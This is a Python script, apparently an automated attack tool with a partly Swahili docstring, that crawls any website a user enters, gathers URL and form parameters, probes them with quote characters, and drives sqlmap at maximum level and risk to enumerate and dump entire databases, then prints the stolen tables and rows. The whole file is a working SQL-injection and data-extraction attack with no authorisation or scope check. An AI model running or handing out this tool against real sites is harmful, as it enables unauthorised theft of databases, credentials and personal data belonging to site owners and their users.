#!/usr/bin/env python3
"""
ADVANCED RECONNAISSANCE & SQLMAP AUTOMATION BOT
Inatoa database yote kwa kutumia URL pekee
"""

import requests
import subprocess
import json
import time
import re
import os
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

class AdvancedReconBot:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        })
        self.discovered_urls = []
        self.vulnerable_params = []
        self.sqlmap_results = {}
    
    def comprehensive_crawl(self, base_url):
        """Comprehensive website crawling"""
        print("🕷️ Starting comprehensive reconnaissance...")
        
        discovered = set([base_url])
        
        try:
            # Initial page crawl
            response = self.session.get(base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                if base_url in full_url and full_url not in discovered:
                    discovered.add(full_url)
                    print(f"🔗 Found: {full_url}")
            
            # Extract all forms and their actions
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                if form_action:
                    form_url = urljoin(base_url, form_action)
                    if form_url not in discovered:
                        discovered.add(form_url)
                        print(f"📝 Form action: {form_url}")
            
            # Look for JavaScript files that might contain API endpoints
            for script in soup.find_all('script', src=True):
                script_src = script['src']
                if script_src:
                    script_url = urljoin(base_url, script_src)
                    if base_url in script_url and script_url not in discovered:
                        discovered.add(script_url)
                        print(f"📜 Script: {script_url}")
            
            return list(discovered)
            
        except Exception as e:
            print(f"❌ Crawling error: {e}")
            return [base_url]
    
    def extract_parameters(self, url):
        """Extract all parameters from URL and forms"""
        print(f"🎯 Extracting parameters from: {url}")
        
        parameters = []
        
        try:
            # Extract from URL query string
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param_name, param_values in query_params.items():
                parameters.append({
                    'url': url,
                    'parameter': param_name,
                    'type': 'GET',
                    'sample_value': param_values[0] if param_values else 'test'
                })
                print(f"✅ GET Parameter: {param_name}")
            
            # Extract from forms
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(url, form_action)
                
                for inp in form.find_all('input'):
                    param_name = inp.get('name', '')
                    if param_name and param_name not in ['submit', 'button']:
                        parameters.append({
                            'url': form_url,
                            'parameter': param_name,
                            'type': form_method.upper(),
                            'sample_value': inp.get('value', 'test'),
                            'input_type': inp.get('type', 'text')
                        })
                        print(f"✅ FORM Parameter: {param_name} ({form_method})")
            
            return parameters
            
        except Exception as e:
            print(f"❌ Parameter extraction error: {e}")
            return []
    
    def run_sqlmap_scan(self, url, parameter, param_type, value):
        """Run SQLMap scan on specific parameter"""
        print(f"🔍 SQLMap scanning: {parameter} in {url}")
        
        try:
            # Create output directory
            output_dir = f"sqlmap_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            os.makedirs(output_dir, exist_ok=True)
            
            # Build SQLMap command
            if param_type == 'GET':
                cmd = [
                    'sqlmap', '-u', url,
                    '-p', parameter,
                    '--batch',
                    '--level=3', '--risk=3',
                    '--dbs',
                    '--tables',
                    '--columns',
                    '--dump',
                    '--output-dir', output_dir
                ]
            else:  # POST
                cmd = [
                    'sqlmap', '-u', url,
                    '--data', f"{parameter}={value}",
                    '--method', 'POST',
                    '-p', parameter,
                    '--batch',
                    '--level=3', '--risk=3',
                    '--dbs',
                    '--tables', 
                    '--columns',
                    '--dump',
                    '--output-dir', output_dir
                ]
            
            # Run SQLMap
            print(f"🚀 Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse results
            scan_result = {
                'parameter': parameter,
                'url': url,
                'type': param_type,
                'output_directory': output_dir,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'vulnerable': 'SQL injection' in result.stdout
            }
            
            if scan_result['vulnerable']:
                print(f"🎉 SQL INJECTION FOUND: {parameter}")
                
                # Extract database information
                databases = self.extract_databases(result.stdout)
                tables = self.extract_tables(result.stdout)
                dumped_data = self.extract_dumped_data(result.stdout)
                
                scan_result.update({
                    'databases': databases,
                    'tables': tables,
                    'dumped_data': dumped_data
                })
            
            return scan_result
            
        except subprocess.TimeoutExpired:
            print(f"⏰ SQLMap timeout for {parameter}")
            return {'error': 'Timeout', 'parameter': parameter}
        except Exception as e:
            print(f"❌ SQLMap error: {e}")
            return {'error': str(e), 'parameter': parameter}
    
    def extract_databases(self, sqlmap_output):
        """Extract database names from SQLMap output"""
        databases = []
        lines = sqlmap_output.split('\n')
        
        for line in lines:
            if 'available databases' in line.lower():
                continue
            if re.match(r'^\[\d+\] (\w+)', line):
                db_name = re.findall(r'^\[\d+\] (\w+)', line)[0]
                if db_name not in ['information_schema', 'mysql', 'performance_schema']:
                    databases.append(db_name)
        
        return databases
    
    def extract_tables(self, sqlmap_output):
        """Extract table names from SQLMap output"""
        tables = []
        lines = sqlmap_output.split('\n')
        capture = False
        
        for line in lines:
            if 'Database:' in line:
                capture = True
                continue
            if capture and line.strip() and not line.startswith('['):
                table_match = re.findall(r'\|\s+(\w+)\s+\|', line)
                if table_match:
                    tables.extend(table_match)
            elif capture and not line.strip():
                capture = False
        
        return tables
    
    def extract_dumped_data(self, sqlmap_output):
        """Extract dumped data from SQLMap output"""
        dumped_data = {}
        lines = sqlmap_output.split('\n')
        current_table = None
        capturing = False
        
        for line in lines:
            if 'Table:' in line:
                current_table = line.split('Table:')[-1].strip()
                dumped_data[current_table] = []
                capturing = True
                continue
            elif capturing and line.strip() and '|' in line:
                # This is a data row
                if not line.startswith('+'):
                    dumped_data[current_table].append(line.strip())
            elif capturing and not line.strip():
                capturing = False
        
        return dumped_data
    
    def advanced_parameter_discovery(self, base_url):
        """Advanced parameter discovery using common patterns"""
        print("🎯 Advanced parameter discovery...")
        
        common_parameters = [
            'id', 'user', 'username', 'password', 'email', 'phone',
            'page', 'category', 'search', 'q', 'query', 'product',
            'article', 'news', 'order', 'sort', 'filter', 'type'
        ]
        
        discovered_params = []
        
        # Test common parameter patterns
        for param in common_parameters:
            test_urls = [
                f"{base_url}?{param}=1",
                f"{base_url}?{param}=test",
                f"{base_url}?{param}='",
                f"{base_url}?{param}=1'"
            ]
            
            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check if parameter is reflected or causes different behavior
                    if param in response.text or response.status_code != 404:
                        discovered_params.append({
                            'url': base_url,
                            'parameter': param,
                            'type': 'GET',
                            'confidence': 'High'
                        })
                        print(f"✅ Discovered parameter: {param}")
                        break
                        
                except:
                    continue
        
        return discovered_params
    
    def automated_sqlmap_attack(self, base_url):
        """Fully automated SQLMap attack"""
        print("🚀 STARTING AUTOMATED SQLMAP ATTACK")
        print("=" * 60)
        
        start_time = time.time()
        
        # Phase 1: Comprehensive Reconnaissance
        print("\n📋 PHASE 1: RECONNAISSANCE")
        print("-" * 30)
        
        all_urls = self.comprehensive_crawl(base_url)
        print(f"📊 Discovered {len(all_urls)} URLs")
        
        # Phase 2: Parameter Extraction
        print("\n📋 PHASE 2: PARAMETER EXTRACTION")
        print("-" * 30)
        
        all_parameters = []
        for url in all_urls:
            params = self.extract_parameters(url)
            all_parameters.extend(params)
            time.sleep(1)  # Be polite
        
        # Phase 3: Advanced Parameter Discovery
        print("\n📋 PHASE 3: ADVANCED DISCOVERY")
        print("-" * 30)
        
        advanced_params = self.advanced_parameter_discovery(base_url)
        all_parameters.extend(advanced_params)
        
        print(f"🎯 Total parameters found: {len(all_parameters)}")
        
        # Phase 4: SQLMap Scanning
        print("\n📋 PHASE 4: SQLMAP SCANNING")
        print("-" * 30)
        print("⚠️ This may take several minutes...")
        
        sqlmap_results = []
        vulnerable_sites = []
        
        for param_info in all_parameters[:10]:  # Limit to first 10 for demo
            result = self.run_sqlmap_scan(
                param_info['url'],
                param_info['parameter'],
                param_info['type'],
                param_info.get('sample_value', 'test')
            )
            
            sqlmap_results.append(result)
            
            if result.get('vulnerable'):
                vulnerable_sites.append({
                    'url': param_info['url'],
                    'parameter': param_info['parameter'],
                    'databases': result.get('databases', []),
                    'tables': result.get('tables', []),
                    'dumped_data': result.get('dumped_data', {})
                })
        
        # Phase 5: Report Generation
        print("\n📋 PHASE 5: REPORT GENERATION")
        print("-" * 30)
        
        end_time = time.time()
        scan_duration = end_time - start_time
        
        # Generate comprehensive report
        report = {
            'target_url': base_url,
            'scan_date': datetime.now().isoformat(),
            'scan_duration': f"{scan_duration:.2f} seconds",
            'urls_discovered': len(all_urls),
            'parameters_found': len(all_parameters),
            'vulnerable_sites_found': len(vulnerable_sites),
            'vulnerable_sites': vulnerable_sites,
            'all_parameters': all_parameters,
            'sqlmap_results_summary': [
                {
                    'parameter': r.get('parameter'),
                    'vulnerable': r.get('vulnerable', False),
                    'databases': r.get('databases', [])
                }
                for r in sqlmap_results
            ]
        }
        
        # Save detailed report
        filename = f"advanced_recon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"💾 Detailed report saved: {filename}")
        
        # Display attack summary
        self.display_attack_summary(report)
        
        return report
    
    def display_attack_summary(self, report):
        """Display attack summary"""
        print("\n" + "=" * 70)
        print("🎯 ADVANCED RECONNAISSANCE & SQLMAP ATTACK SUMMARY")
        print("=" * 70)
        print(f"🎯 Target: {report['target_url']}")
        print(f"📅 Scan Date: {report['scan_date']}")
        print(f"⏱️ Duration: {report['scan_duration']}")
        print(f"🔗 URLs Discovered: {report['urls_discovered']}")
        print(f"🎯 Parameters Found: {report['parameters_found']}")
        print(f"🚨 Vulnerable Sites: {report['vulnerable_sites_found']}")
        
        if report['vulnerable_sites']:
            print(f"\n💀 CRITICAL FINDINGS - DATABASES COMPROMISED:")
            for i, site in enumerate(report['vulnerable_sites'], 1):
                print(f"\n{i}. {site['url']}")
                print(f"   Parameter: {site['parameter']}")
                print(f"   Databases: {', '.join(site['databases'])}")
                
                if site['tables']:
                    print(f"   Tables: {', '.join(site['tables'][:5])}...")
                
                if site['dumped_data']:
                    for table, data in list(site['dumped_data'].items())[:3]:
                        print(f"   Data from {table}: {len(data)} rows")
        
        print(f"\n💡 SECURITY ASSESSMENT:")
        if report['vulnerable_sites_found'] > 0:
            print("   🚨 CRITICAL: SQL Injection vulnerabilities found!")
            print("   💀 Databases can be fully extracted")
            print("   🔓 User credentials and sensitive data at risk")
        else:
            print("   ✅ No SQL Injection vulnerabilities detected")
            print("   🔒 Database appears to be secure")

def main():
    print("🚀 ADVANCED RECONNAISSANCE & SQLMAP AUTOMATION BOT")
    print("=" * 70)
    print("Extracts entire databases using URL only")
    print("=" * 70)
    
    # Get target URL
    target_url = input("🌐 Enter target website URL: ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Check if SQLMap is installed
    try:
        subprocess.run(['sqlmap', '--version'], capture_output=True, check=True)
    except:
        print("❌ SQLMap is not installed or not in PATH")
        print("💡 Install with: pip install sqlmap")
        return
    
    # Create bot and run attack
    bot = AdvancedReconBot()
    
    try:
        print(f"\n🎯 Starting advanced reconnaissance on: {target_url}")
        print("⚠️ This will perform intensive scanning...")
        print("⏳ May take 5-15 minutes depending on the site...")
        
        report = bot.automated_sqlmap_attack(target_url)
        
        print("\n🎉 ADVANCED RECONNAISSANCE COMPLETED!")
        print("🔓 Database extraction attempted!")
        
    except KeyboardInterrupt:
        print("\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"💥 Attack failed: {e}")

if __name__ == "__main__":
    main()
